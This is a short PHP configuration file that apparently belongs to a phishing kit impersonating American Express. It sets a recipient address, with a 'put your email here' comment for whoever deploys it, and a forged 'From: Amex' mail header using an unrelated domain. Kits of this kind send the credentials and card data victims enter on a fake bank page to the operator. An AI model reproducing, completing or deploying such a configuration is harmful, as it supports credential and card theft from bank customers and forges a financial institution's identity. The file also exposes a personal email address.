<?php	

$email  = 'singh.presa@protonmail.com'; // put your email here

$from = "From: Amex  <amex@zillerrr.com>";


?>